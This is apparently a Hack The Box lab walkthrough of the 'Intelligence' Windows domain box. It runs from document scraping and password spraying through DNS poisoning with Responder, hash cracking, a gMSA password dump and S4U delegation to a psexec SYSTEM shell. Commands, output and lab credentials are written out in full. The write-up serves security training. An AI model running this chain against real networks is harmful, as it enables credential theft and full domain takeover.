<img width="1104" height="142" alt="image" src="https://github.com/user-attachments/assets/687c66e2-8030-4c5a-9836-cf7932e67917" />


Intelligence is a medium rated box from htb, this box was fun active directory box. At start it was a webserver where two documents were present , by looking the at the pattern how the douments were uploaded i ran a script which downloaded all the documents which were uploaded by looking at the documents creator metadata i got a list of users and one the document had a default organization password, after password spraying i found one user is using the default password.

After getting the credentials, i enumerated the smb server and got a powershell script which was executed every 5mins by the another, this script checked the dns entries perform a simple webs request, since my suer had permission to add dns entries i added a dns record which pointed to my server, using responder i got the ntlm hash of the second user and after cracking it i saw the second user has a readgmsapassword right opver a machine account. after getting the hash of the machine account i performed a delegation attack to impersonate as a administrator and got shell as administrator using impacket-psexec script.

# Enumeration

## Nmap

```bash
nmap -p- --min-rate=2000 -sVC -oN nmap 10.10.10.248

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Intelligence
|_http-favicon: Unknown favicon MD5: 556F31ACD686989B1AFCF382C05846AA
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-09-13 21:26:48Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-09-13T21:28:39+00:00; +6h34m14s from scanner time.
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.intelligence.htb
| Issuer: commonName=intelligence-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-04-19T00:43:16
| Not valid after:  2022-04-19T00:43:16
| MD5:   7767:9533:67fb:d65d:6065:dff7:7ad8:3e88
|_SHA-1: 1555:29d9:fef8:1aec:41b7:dab2:84d7:0f9d:30c7:bde7
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-09-13T21:28:39+00:00; +6h34m15s from scanner time.
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.intelligence.htb
| Issuer: commonName=intelligence-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-04-19T00:43:16
| Not valid after:  2022-04-19T00:43:16
| MD5:   7767:9533:67fb:d65d:6065:dff7:7ad8:3e88
|_SHA-1: 1555:29d9:fef8:1aec:41b7:dab2:84d7:0f9d:30c7:bde7
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-09-13T21:28:41+00:00; +6h34m15s from scanner time.
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.intelligence.htb
| Issuer: commonName=intelligence-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-04-19T00:43:16
| Not valid after:  2022-04-19T00:43:16
| MD5:   7767:9533:67fb:d65d:6065:dff7:7ad8:3e88
|_SHA-1: 1555:29d9:fef8:1aec:41b7:dab2:84d7:0f9d:30c7:bde7
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-09-13T21:28:38+00:00; +6h34m15s from scanner time.
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.intelligence.htb
| Issuer: commonName=intelligence-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-04-19T00:43:16
| Not valid after:  2022-04-19T00:43:16
| MD5:   7767:9533:67fb:d65d:6065:dff7:7ad8:3e88
|_SHA-1: 1555:29d9:fef8:1aec:41b7:dab2:84d7:0f9d:30c7:bde7
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49693/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49694/tcp open  msrpc         Microsoft Windows RPC
49713/tcp open  msrpc         Microsoft Windows RPC
49728/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 6h34m14s, deviation: 0s, median: 6h34m14s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-09-13T21:27:57
|_  start_date: N/A
```

We see a ton of ports open let’s start with the web server.

## Webserver

ON the webserver it was a simple html page with some documents on it.

<img width="1318" height="912" alt="image" src="https://github.com/user-attachments/assets/702ec7cf-f53b-44f9-89fd-73e586899e20" />


We see we can download two documents

<img width="839" height="97" alt="image" src="https://github.com/user-attachments/assets/a3f5357c-780b-4bd9-b30d-6ce4b4edaabf" />


We see a pattern that the documents uploaded have a format as year-month-date-upload.pdf

Now we can create a date list from the year 2019 to 2012 with months and date and download all the documents and look for intresting information.

### Generating the dates and downloading all the pdf files

```bash
from datetime import date, timedelta

start_date = date(2019, 1, 1)
end_date = date(2021, 12, 31)

delta = timedelta(days=1)
current_date = start_date

while current_date <= end_date:
    print(current_date.strftime("%Y-%m-%d"))
    current_date += delta
   
```

Now that we have the dates we can bruteforce using fuff to find all the documents.

```bash
ffuf -u http://10.10.10.248/documents/FUZZ-upload.pdf -ic -c -w dates

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.248/documents/FUZZ-upload.pdf
 :: Wordlist         : FUZZ: /home/kali/htb/intelligence/dates
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

2020-01-02              [Status: 200, Size: 27002, Words: 229, Lines: 199, Duration: 106ms]
2020-01-01              [Status: 200, Size: 26835, Words: 241, Lines: 209, Duration: 116ms]
2020-01-04              [Status: 200, Size: 27522, Words: 223, Lines: 196, Duration: 165ms]
2020-02-11              [Status: 200, Size: 25245, Words: 241, Lines: 198, Duration: 224ms]
2020-01-10              [Status: 200, Size: 26400, Words: 232, Lines: 205, Duration: 124ms]
2020-02-17              [Status: 200, Size: 11228, Words: 167, Lines: 132, Duration: 173ms]
2020-01-20              [Status: 200, Size: 11632, Words: 157, Lines: 127, Duration: 175ms]
....
....
....
```

we can take the dates input and throw it in a file called dates-dump and then perform some regex to get all the valid dates

```bash
cat dates-dump | cut -d ' '  -f1 > valid-dates
```

this will give all the dates, now we can use a bash scrip to download all the documents into a folder named downloads

```bash
awk '{print "http://intelligence.htb/documents/" $0 "-upload.pdf"}' valid-dates > urls.txt

mkdir -p downloads

wget -nc -i urls.txt -P downloads/
```

Now we downloaded all the documents let’s get all the creators name and make a list of users 

```bash
exiftool downloads/* | grep -i creator | cut -d ':' -f2 | cut -d ' ' -f2 > users
```

We can use this command to generate the list of users

### PDF Files

After enumerating all the pdf files i saw this content in one of the pdf file, a default organization password is given to the users we can password spary and try to get a hit.

```bash
New Account Guide
Welcome to Intelligence Corp!
Please login using your username and the default password of:
NewIntelligenceCorpUser9876
After logging in please change your password as soon as possible
```

# Exploitation

## Password Spray

```bash
nxc smb intelligence.htb -u users -p 'NewIntelligenceCorpUser9876'                 
SMB         10.10.10.248    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False) 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\William.Lee:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Scott.Scott:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jason.Wright:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Veronica.Patel:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jennifer.Thomas:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Danny.Matthews:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               
...
.
SMB         10.10.10.248    445    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876 
```

Now we have creds for Tiffany lets enumerate smb share for user Tiffany

## More Enumeration

```bash
smbclient -L //10.10.10.248/ -U Tiffany.Molina  
Password for [WORKGROUP\Tiffany.Molina]:

      Sharename       Type      Comment
      ---------       ----      -------
      ADMIN$          Disk      Remote Admin
      C$              Disk      Default share
      IPC$            IPC       Remote IPC
      IT              Disk      
      NETLOGON        Disk      Logon server share 
      SYSVOL          Disk      Logon server share 
      Users           Disk      
```

Here we can list the smb share and there are two non-default shares

Let’s Enumerate the IT share

```bash
smbclient //10.10.10.248/IT -U Tiffany.Molina 
Password for [WORKGROUP\Tiffany.Molina]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Apr 18 20:50:55 2021
  ..                                  D        0  Sun Apr 18 20:50:55 2021
  downdetector.ps1                    A     1046  Sun Apr 18 20:50:55 2021

       3770367 blocks of size 4096. 1461962 blocks available
smb: \> get downdetector.ps1 
getting file \downdetector.ps1 of size 1046 as downdetector.ps1 (2.3 KiloBytes/sec) (average 2.3 KiloBytes/sec)
```

We see a script named downdetector.ps1

```bash
cat downdetector.ps1 
��# Check web server status. Scheduled to run every 5min
Import-Module ActiveDirectory 
foreach($record in Get-ChildItem "AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb" | Where-Object Name -like "web*")  {
try {
$request = Invoke-WebRequest -Uri "http://$($record.Name)" -UseDefaultCredentials
if(.StatusCode -ne 200) {
Send-MailMessage -From 'Ted Graves <Ted.Graves@intelligence.htb>' -To 'Ted Graves <Ted.Graves@intelligence.htb>' -Subject "Host: $($record.Name) is down"
}
} catch {}
}
```

This is a powershell script which executes every 5 mins. We see that it is a for loop over the dns records which is getting all the dns records which matches with web and send a web request using Default Creds.

Now we have creds we can authenticate using kerberos and add a dns record.

We can add a dns record pointing at our ip and then turn on the responder to catch the ntlm hash

### Authenticating using kerberos

```bash
$ kinit Tiffany.Molina@INTELLIGENCE.HTB
Password for Tiffany.Molina@INTELLIGENCE.HTB                                      
$ klist                                
Ticket cache: FILE:Tiffany.Molina.ccache
Default principal: Tiffany.Molina@INTELLIGENCE.HTB

Valid starting       Expires              Service principal
09/14/2025 15:12:52  09/15/2025 01:12:52  krbtgt/INTELLIGENCE.HTB@INTELLIGENCE.HTB
        renew until 09/15/2025 15:12:47
```

We can get a tgt for the user tiffany and export it to the variable KRB5NAME

### Adding the DNS record

We can create a file named add.txt with the content inside.

```bash
server dc.intelligence.htb
zone intelligence.htb
update add web1.intelligence.htb 3600 A 10.10.16.10
send
```

Next we can use nsupdate to add the dns records

```bash
 nsupdate -g add.txt
```

We can see that our record for web1 is on the dns records which points on 10.10.16.10

```bash
dig @10.10.10.248 web1.intelligence.htb      
;; communications error to 10.10.10.248#53: timed out

; <<>> DiG 9.20.11-4+b1-Debian <<>> @10.10.10.248 web1.intelligence.htb
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 19061
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;web1.intelligence.htb.         IN      A

;; ANSWER SECTION:
web1.intelligence.htb.  3600    IN      A       10.10.16.10

;; Query time: 55 msec
;; SERVER: 10.10.10.248#53(10.10.10.248) (UDP)
;; WHEN: Sun Sep 14 15:13:23 EDT 2025
;; MSG SIZE  rcvd: 66
```

We can run responder and grab the hash of the user ted

```bash
esponder Machine Name     [WIN-6MWCLGNO4C6]
    Responder Domain Name      [L0T6.LOCAL]
    Responder DCE-RPC Port     [46668]

[+] Listening for events...                                                                                                  

[*] Skipping previously captured hash for intelligence\Ted.Graves
```

Now we have the hash lets crack it using hashcat

```bash
hashcat hash /home/panda/Downloads/books/rockyou.txt --show 
Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

5600 | NetNTLMv2 | Network Protocol

NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
Do NOT report auto-detect issues unless you are certain of the hash type.

TED.GRAVES::intelligence:ff6d2915f4335d70:40411bae008e1753ae33ec3fe8bb881a:0101000000000000c038f2797925dc0114e4888df8887590000000000200080042004d004f00560001001e00570049004e002d00390038005700560043003300440045004900390036000400140042004d004f0056002e004c004f00430041004c0003003400570049004e002d00390038005700560043003300440045004900390036002e0042004d004f0056002e004c004f00430041004c000500140042004d004f0056002e004c004f00430041004c000800300030000000000000000000000000200000be763588ea9ef1f4b670be1d87f26b205ec7798c2cdf51f7364621b09ee8c3fe0a001000000000000000000000000000000000000900320048005400540050002f007700650062002e0069006e00740065006c006c006900670065006e00630065002e006800740062000000000000000000:Mr.Teddy
```

## Bloodhound

We can use ldap to get the bloodhound data and upload it to bloodhound and look for some outbound controls

```bash
nxc ldap 10.10.10.248 -u Ted.Graves -p 'Mr.Teddy' --bloodhound -c all --dns-server 10.10.10.248
LDAP        10.10.10.248    389    DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:intelligence.htb)
LDAP        10.10.10.248    389    DC               [+] intelligence.htb\Ted.Graves:Mr.Teddy 
LDAP        10.10.10.248    389    DC               Resolved collection methods: localadmin, container, rdp, group, acl, psremote, trusts, dcom, session, objectprops                                                                       
LDAP        10.10.10.248    389    DC               Done in 01M 02S
LDAP        10.10.10.248    389    DC               Compressing output into /root/.nxc/logs/DC_10.10.10.248_2025-09-14_152136_bloodhound.zip
```

<img width="1216" height="453" alt="image" src="https://github.com/user-attachments/assets/5b67db98-0a3a-4d51-8cba-d16f9cba9694" />


We see that our user ted is a member of itsupport group which have readGMSAPassword outbound controlls over sqv_int$ which is a machine account and using that account we can create a silver ticket attack and impersonate as a user.

### ReadGMSAPassword

```bash
python gMSADumper.py -u 'Ted.Graves' -p 'Mr.Teddy' -d 'intelligence.htb'
Users or groups who can read password for svc_int$:
 > DC$
 > itsupport
svc_int$:::1dcabcce2cf522bae77d7dc622587879
svc_int$:aes256-cts-hmac-sha1-96:331c8820d64c744ba82a28551b76dc2dc00991df0e253fa613d37c4684e045fd
svc_int$:aes128-cts-hmac-sha1-96:40122d8d49ee8c46ea793c19b3a59d08
```

We have the ntlm hash for the svc_int$ user.

## AllowedToDelegate

### Requesting a Ticket using impacket-getST

```bash
impacket-getST -spn WWW/dc.intelligence.htb -impersonate Administrator intelligence.htb/svc_int$ -hashes  1dcabcce2cf522bae77d7dc622587879:1dcabcce2cf522bae77d7dc622587879
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@WWW_dc.intelligence.htb@INTELLIGENCE.HTB.ccache
```

We can export this to KRB5NAME and use psexec to get a administartor shell

```bash
KRB5CCNAME=Administrator@WWW_dc.intelligence.htb@INTELLIGENCE.HTB.ccache impacket-psexec -k -no-pass intelligence.htb/administrator@dc.intelligence.htb      
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on dc.intelligence.htb.....
[*] Found writable share ADMIN$
[*] Uploading file ggxGcpJS.exe
[*] Opening SVCManager on dc.intelligence.htb.....
[*] Creating service kbuj on dc.intelligence.htb.....
[*] Starting service kbuj.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.1879]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> hostname
dc

C:\Windows\system32> whoami
nt authority\system
```
